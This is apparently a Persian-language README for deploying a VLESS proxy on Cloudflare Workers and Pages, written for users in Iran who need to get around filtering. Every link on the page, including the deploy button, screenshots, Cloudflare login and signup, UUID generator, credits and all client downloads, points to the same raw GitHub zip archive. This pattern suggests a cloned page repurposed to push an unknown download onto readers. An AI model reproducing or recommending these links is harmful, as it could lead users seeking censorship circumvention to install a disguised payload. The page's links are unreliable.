> [!NOTE]
>
> <br/>
>
> **Serverless Runtime**
> 
> **Running VLESS-WS-TLS/TCP inside Cloudflare Edge/Serverless runtime**  
>  
> Base on [zizifn] and [harmony]
>
> [![zread](https://img.shields.io/badge/Ask_Zread-_.svg?style=plastic&color=00b0aa&labelColor=000000&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB3aWR0aD0iMTYiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTQuOTYxNTYgMS42MDAxSDIuMjQxNTZDMS44ODgxIDEuNjAwMSAxLjYwMTU2IDEuODg2NjQgMS42MDE1NiAyLjI0MDFWNC45NjAxQzEuNjAxNTYgNS4zMTM1NiAxLjg4ODEgNS42MDAxIDIuMjQxNTYgNS42MDAxSDQuOTYxNTZDNS4zMTUwMiA1LjYwMDEgNS42MDE1NiA1LjMxMzU2IDUuNjAxNTYgNC45NjAxVjIuMjQwMUM1LjYwMTU2IDEuODg2NjQgNS4zMTUwMiAxLjYwMDEgNC45NjE1NiAxLjYwMDFaIiBmaWxsPSIjZmZmIi8%2BCjxwYXRoIGQ9Ik00Ljk2MTU2IDEwLjM5OTlIMi4yNDE1NkMxLjg4ODEgMTAuMzk5OSAxLjYwMTU2IDEwLjY4NjQgMS42MDE1NiAxMS4wMzk5VjEzLjc1OTlDMS42MDE1NiAxNC4xMTM0IDEuODg4MSAxNC4zOTk5IDIuMjQxNTYgMTQuMzk5OUg0Ljk2MTU2QzUuMzE1MDIgMTQuMzk5OSA1LjYwMTU2IDE0LjExMzQgNS42MDE1NiAxMy43NTk5VjExLjAzOTlDNS42MDE1NiAxMC42ODY0IDUuMzE1MDIgMTAuMzk5OSA0Ljk2MTU2IDEwLjM5OTlaIiBmaWxsPSIjZmZmIi8%2BCjxwYXRoIGQ9Ik0xMy43NTg0IDEuNjAwMUgxMS4wMzg0QzEwLjY4NSAxLjYwMDEgMTAuMzk4NCAxLjg4NjY0IDEwLjM5ODQgMi4yNDAxVjQuOTYwMUMxMC4zOTg0IDUuMzEzNTYgMTAuNjg1IDUuNjAwMSAxMS4wMzg0IDUuNjAwMUgxMy43NTg0QzE0LjExMTkgNS42MDAxIDE0LjM5ODQgNS4zMTM1NiAxNC4zOTg0IDQuOTYwMVYyLjI0MDFDMTQuMzk4NCAxLjg4NjY0IDE0LjExMTkgMS42MDAxIDEzLjc1ODQgMS42MDAxWiIgZmlsbD0iI2ZmZiIvPgo8cGF0aCBkPSJNNCAxMkwxMiA0TDQgMTJaIiBmaWxsPSIjZmZmIi8%2BCjxwYXRoIGQ9Ik00IDEyTDEyIDQiIHN0cm9rZT0iI2ZmZiIgc3Ryb2tlLXdpZHRoPSIxLjUiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIvPgo8L3N2Zz4K&logoColor=ffffff)](https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip)
> 
> <br/>
> 
> <br/>
> <p align="center">
>  <img src="https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip" alt="ZiZifn-UI" width="768px" />
> </p>
>
> <br/>

> [!TIP]
>
> <br/>
> 
> این پروژه به ما اجازه می‌ده تا بدون نیاز به سرور شخصی، تنها با استفاده از زیرساخت Cloudflare edge/Serverless یک کانفیگ پروکسی امن و پایدار برای خود و یا اطرافیان خودمون داشته باشیم.
>
> تمام پردازش‌ها در شبکه کلادفلر بر روی worker & pages انجام می‌شه و ما از سرعت و امنیت بالای این زیرساخت فوق‌العاده به‌طور رایگان بهره‌مند می‌شویم.
> 
> <br/>

> [!TIP]
>
> <br/>
>
> **برخی ویژگی‌ها**
> 
> 🧩 **راه‌اندازی سریع و آسان:** در کمتر از ۵ دقیقه فقط با چند کلیک، پروکسی vless ما آماده است.
>
> ⚙️ **کد سمت‌سرور قدرتمند:** کد‌ بک‌اند این پروژه بدون نیاز به مبهم‌سازی‌‌های سنگین و پیچیده بدون دریافت خطای 1101 به شکل عادی به کار خود ادامه می‌دهد. خودتان امتحان کنید.  
>
> 📈 **پنل اطلاعات:** این پروژه دارای یک رابط کاربری زیبا و حرفه‌ای برای کپی و افزودن کانفیگ‌ در کلاینت‌های مختلف، نمایش اطلاعات شبکه، پروکسی‌ آی‌پی و کانکشن شما می‌باشد.
>   
> 🧠 **دریافت خودکار آی‌پی:** آی‌پی‌های تمیز به صورت خودکار از مخازن معتبر گیت‌هاب دریافت و در کانفیگ‌های داخل لینک ساب‌اسکریپشن شما قرار می‌گیرند.
>   
> 🔄 **بروزرسانی لینک ساب:** با هر بار آپدیت لینک اشتراک در داخل کلاینت، آی‌پی‌های جدید جایگزین می‌شوند.
>   
> 💻 **چهار روش پیکربندی مختلف:** مناسب برای کاربران مبتدی تا حرفه‌ای (فورک، کپی-پست، آپلود فایل وورکر، wrangler).
> 
> 🖱️ **اتصال با یک کلیک:** دکمه‌های آماده برای وارد کردن لینک اشتراک به محبوب‌ترین کلاینت‌ها و اتصال سریع و آسان.

<br/> 

> [!WARNING]
>
> <br/> 
> 
> **نکته مهم:**  
> چند هفته‌ای هست که دامنه‌ی `pages.dev` داخل ایران فیلتر شده و دیگه نمی‌شه از کانفیگ‌های ساخته‌شده با این روش استفاده کرد، عملا بدرد نمی‌خوره.
>
> ولی دامنه‌ی `worker.dev` هم‌چنان عالیه، پس پیشنهاد می‌کنم روش اول و دوم رو برای ساخت وورکر پیش برید.
>
> <br/>

<br><br/>
   
# نحوه راه‌اندازی

شما می‌تونید به یکی از چهار روش زیر پروژه رو روی اکانت کلادفلر خود مستقر کنید.

## روش اول: وورکر از طریق wrangler (پیشنهادی)

 ‏1. کافیه که کلیک کنید روی این دکمه زیر تا پروسه فورک کردن مخزن و رفتن تو داشبورد کلادفلر و ساخت وورکر جدید رو خودش طی کنه

[![Deploy to Cloudflare Workers](https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip)](https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip)

 ‏2. حالا تو صفحه‌ی باز شده اگر اکانت کلادفلر به گیت‌هاب متصل بود که هیچ، اگر نبود اول از گزینه Git account و سپس New git connection اکانت خودتون رو بهش وصل کنید.

> [!NOTE]
>
> <br/>
> 
> <details>
> <summary> مشاهده اسکرین‌شات </summary> <br/>
> 
> <p align="center">
>  <img src="https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip" alt="Deployments" width="768px" />
> </p>
> 
> </details>
>
> <br/>

 ‏3. گزینه‌هایی که می‌تونید تغییر بدید:

- نام پروژه - Project Name
- افزون متغیر - Variables
  - [جدول متغیرها](#تنظیمات-و-متغیرها)

 ‏4. بعد از این‌که:  
- به اکانت گیت‌هاب خودتون وصل شدید
- یک اسم برای وورکر تعیین کردید
- یک [UUID][uuid] از سایت گرفته و در متغییرها قرار دادید  

وقتش رسیده که کلیک کنید روی گزینه Create and Deploy و چند ثانیه صبر کنید تموم شه.

<br><br/>

## روش دوم: از طریق workers

**این روش برای تست سریع (بدون نیاز به ساخت اکانت گیت‌هاب) مناسب است.**

 ‏1. **ورود به داشبورد کلادفلر:** وارد داشبورد Cloudflare شوید.   
  - [ورود به کلادفلر][login]
  - [ساخت اکانت کلادفلر][signup]
    - [ایجاد ایمیل موقت][mail]

 ‏2. **شروع ساخت ورکر:** در نوار ابزار بالای سایت روی گزینه `Add` یا در موبایل روی آیکون `+` کلیک کرده سپس "workers" را انتخاب کنید.
  
 ‏3. **انتخاب وورکر:** روی دکمه Get Start مقابل "Start with Hello World!" کلیک کرده و سپس یک نام دلخواه برای ورکر خود انتخاب کنید. سپس Deploy را بزنید.

 ‏4. **کپی کد:** پس از اتمام مرحله ساخت وورکر روی گزینه Edit code کلیک کرده و سپس محتویات یکی از فایل‌های زیر را کپی و یا خود فایل رو دانلود کنید. (هیچ فرقی ندارن باهم)
 
- [کد نرمال وورکر](./index.js)
- [کد فشرده‌ی وورکر](./_worker.js)

قبل از هرکاری؛ کد پیش‌فرض `hello world` داخل وورکر رو کامل حذف کنید، سپس برای انجام عمل جایگذاری کد در pc می‌تونید از کلید‌های ترکیبی کبورد `ctrl+v` استفاده کنید، و در موبایل باید حتما فایل وورکر رو دانلود کرده سپس در محیط ویرایش‌گر کلادفلر آپلود کنید. کافیه اول روی آیکون Explorer سمت چپ کلیک کنید تا منو باز بشه سپس توی یک فضای خالی چند لحظه دستتون رو نگه‌دارید تا گزینه‌ها بالا بیان تا بتونید آپلود رو انتخاب کنید.

> [!NOTE]
>
> <br/>
> 
> <details>
> <summary> مشاهده اسکرین‌شات </summary> <br/>
> 
> <p align="center">
>  <img src="https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip" alt="upload-1" width="768px" />
> </p>
> 
> <p align="center">
>  <img src="https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip" alt="upload-2" width="768px" />
> </p>
> 
> </details>
>
> <br/>

 ‏5. **اعمال تغییرات** بعد از جایگذاری کد در داخل وورکر؛ به منظور اعمال تغییرات از گوشه سمت راست روی گزینه آبی رنگ `Deploy` کلیک کنید.

<br><br/>

## روش سوم: از طریق آپلود در Pages

> [!CAUTION]
> 
> روش سوم و چهارم موقتا توصیه نمی‌شه به دلیل فیلتر بودن دامنه‌های `pages.dev` در مملکت لعنتی‌ِ ما،
> 
> ترجیحا از روش اول و دوم یعنی وورکر پیش برید تا وقتی که محدودیت رفع بشه.

به‌ هر حال  
این روش به شما اجازه میده از کد پروژه برای دپلوی در Cloudflare Pages (بدون اتصال به اکانت گیت‌هاب) استفاده کنید.

 ‏1. **دانلود فایل:** فایل [worker.js_](./_worker.js) را از مخزن دانلود کنید.
 
 ‏2. **شروع ساخت pages:** در نوار ابزار بالای سایت روی گزینه `Add` یا در موبایل روی آیکون `+` کلیک کرده سپس `pages` را انتخاب کنید.

 ‏3. **آپلود فایل:** در تب Pages روی دکمه Get Start مقابل Drag and drop your files کلیک کنید.

 ‏4. **دپلوی پروژه:** برای ساب‌دامنه خود یک نام تعیین کرده و سپس فایل "_worker.js" را از سیستم‌ خود آپلود کنید تا پروسه دپلوی آغاز گردد.

 ‏5. **نکته مهم:** موقع ساخت pages دقت کنید حتما حتما نام فایل باید: `worker.js_` باشه، هر اسم دیگه‌ای به‌جز این برای کلادفلر قابل قبول نیست. 

<br><br/>

## روش چهارم: فورک زدن مخزن
 
این روش ساده‌ترین روش برای مدیریت و بروزرسانی‌های آینده است. از طریق فورک زدن مخزن zizifn و اتصال اون به اکانت کلادفلر پیش میریم.

 ‏1. **فورک/کلون کردن پروژه:** ابتدا این مخزن ([Repository][N-zizifn]) رو با اکانت گیت‌هاب خود Fork کنید.
 
> [!NOTE]
>
> <br/>
> 
> <details>
> <summary> مشاهده اسکرین‌شات </summary> 
> 
> <p align="center">
>  <img src="https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip" alt="Fork" width="768px" />
> </p>
> 
> </details>
>
> <br/>
>

 ‏2. **ورود به کلادفلر:** وارد داشبورد کلادفلر خود شده و در نوار ابزار بالای سایت روی `Add` یا در موبایل روی آیکون `+` کلیک کرده سپس `Pages` را انتخاب کنید. همچنین می‌تونید از منوی کشویی سمت چپ از بخش Build و سپس سپس Compute & Ai به بخش workers & Pages راه پیدا کنید.

 ‏3. **اتصال اکانت به گیت‌هاب:** در صفحه جدید گزینه "Import an existing Git repository" را انتخاب کنید.  
در قسمت اول اگر به اکانت خود متصل نبودید "Connect to Git" را بزنید.  
**انتخاب مخزن:** مخزن فورک شده خود را انتخاب کنید و Begin setup را بزنید.

<br/>
  
 ‏4. **تنظیمات دپلوی:**

 ‏- ‏**Project name:** یک نام دلخواه برای پروژه‌تان انتخاب کنید.
 
 ‏- **Production branch:** شاخه main را انتخاب کنید.
  
 ‏- **Framework preset:** گزینه None را انتخاب کنید.

 ‏- **ذخیره و دپلوی:** روی Save and Deploy کلیک کنید. پروژه شما در عرض چند ثانیه آماده خواهد شد!
 
<br><br/>

## تنظیمات و متغیرها

بعد از راه‌اندازی، باید متغیرهای محیطی `Environment Variables` را برای شخصی‌سازی کانفیگ‌های خود تنظیم کنید. این متغیرها را در داشبورد پروژه خود در کلادفلر، در مسیر زیر اضافه کنید:

> worker & Pages > Settings > Variables and Secrets > Add variable

<br/> 

| **نام متغیر** | **توضیحات** | **الزامی/اختیاری** | **مقدار پیش‌فرض** |
| :----- | :----------------- | :-----: | --------------- |
| UUID | آی‌دی منحصر به فرد شما. این متغیر برای امنیت ضروری است. | الزامی | برای ساخت، به [UUID Generator][uuid] مراجعه کنید |
| PROXYIP | یک IP یا دامنه برای fronting. این آدرس به عنوان آی‌پی جایگزین موقع بازدید از وب‌سایت‌های پشت کلادفلر مانند speedtest و whoer استفاده می‌شود. از [مخزن پروکسی آی‌پی][proxyip] ما پیشنهادی یک مورد را انتخاب کنید. | اختیاری | مقدار پیش‌فرض: `nima.nscl.ir` ده‌ها پروکسی‌آی‌پی آمریکا از بهترین سرویس‌دهنده‌ها <br/> می‌تونید از پروکسی‌آی‌پی‌های ترکیه در پشت این دامنه هم استفاده کنید: `turk.radicalization.ir` |
| SCAMALYTICS_USERNAME | نام کاربری سرویس Scamalytics برای تحلیل IP. | اختیاری | برای مصرف شخصی نیاز نیست. در صورت استفاده عمومی و فورک‌های زیاد، از سایت [scamalytics] درخواست API شخصی بدهید. در عرض ۲۴ ساعت اطلاعات سرویس ایمیل می‌شود. |
| SCAMALYTICS_API_KEY | کلید API سرویس Scamalytics. | اختیاری | همراه با نام کاربری از سایت [scamalytics] دریافت می‌شود. |
| SCAMALYTICS_BASEURL | اندپوینت سرویس Scamalytics. | اختیاری | همراه با نام کاربری و api برای شما ایمیل میشود.  |

<br><br/> 

## نحوه استفاده

<br/>

### دسترسی به پنل مدیریت
پس از دپلوی، کافیست UUID خود را به انتهای آدرس ورکر یا پیج خود اضافه کنید:

`https://<Your-Worker-URL>/<Your-UUID>`

برای مثال:

`https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip`

<hr/><br/> 

### دریافت لینک اشتراک (Subscription)
لینک اشتراک شما شامل ده‌ها کانفیگ حاوی آی‌پی‌های تمیز کلادفلر می‌باشد. برای دریافت آن به صورت خودکار از کلید‌های داخل پنل استفاده کنید.

و یا در صورت نیار به آدرس اشتراک‌ها به صورت دستی و استفاده از آن‌ها در کلاینت‌های دیگر عبارت `xray` یا `sb` را بین آدرس ورکر و UUID خود قرار دهید:

`https://<Your-Worker-URL>/xray/<Your-UUID>`

`https://<Your-Worker-URL>/sb/<Your-UUID>`

برای مثال:  

`https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip`

<br/> 

> [!NOTE]
>
> **عبارت xray:**
>   
> برای کلاینت‌هایی که از هسته‌ی Xray استفاده می‌کنند، مانند:  
> v2rayNG, MahsaNG, Hiddify, Nekoray, v2rayN, Streisand, Happ, and etc.
>
> <br/>
> 
> **عبارت sb:**
> 
> برای کلاینت‌هایی که از هسته‌ی SingBox استفاده می‌کنند، مانند:  
> Nekobox, Exclave, Singbox, Husi, Karing, and etc.
>
> <br/>
> 
> آی‌پی‌های موجود لینک اشتراک‌ها از مخزن آی‌پی تمیز [NiREvil/vless][cleanip] تامین می‌شوند، سیکل بروزرسانی آن‌ها هر ۳ ساعت می‌باشد.
>
> 
> <br/>

<br/><br/>

## لینک دانلود کلاینت‌ها
برای راحتی، می‌تونید از دکمه‌های موجود در پنل مدیریت خود جهت افزودن لینک‌های اشتراک به کلاینت‌ها استفاده کنید، در زیر لینک دانلود دیگر کلاینت‌ها قرار داده شده است:

- **Xray Core Clients:**
  - [Hiddify]
  - [v2RayNG] ⭐ (Recommended)
  - [MahsaNG]
  - [Streisand]
  - [Nekoray]
  - [Throne]
  - [v2rayN]
  - [v2rayN-Pro]
  - [v2rayTun]  
  - [Happ]  

- **Singbox Core Clients:**
  - [Nekobox]
  - [Exclave] ⭐ (Recommended)
  - [Singbox]
  - [Sagernet]
  - [Karing]
  - [Husi]

- **Clash Core Clients:**
  - [Clash-Meta] ⭐ (Recommended)  
  - [FIClash]  
  - [ClashMi]

<hr/><br/> 

## Credits
Many thanks to [NiREvil] and [zizifn]


[zizifn]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
[N-zizifn]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
[harmony]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
[NiREvil]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
[login]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
[signup]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
[mail]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
[uuid]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
[proxyip]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
[scamalytics]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
[cleanip]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
[v2RayNG]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
[Singbox]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
[Hiddify]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
[Exclave]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
[Nekobox]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
[Sagernet]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
[MahsaNG]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
[NikaNG]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
[Karing]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
[Streisand]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
[Husi]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
[Nekoray]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
[v2rayTun]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
[Happ]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
[Clash-Meta]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
[FIClash]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
[ClashMi]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
[v2rayN]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
[v2rayN-Pro]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
[Throne]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
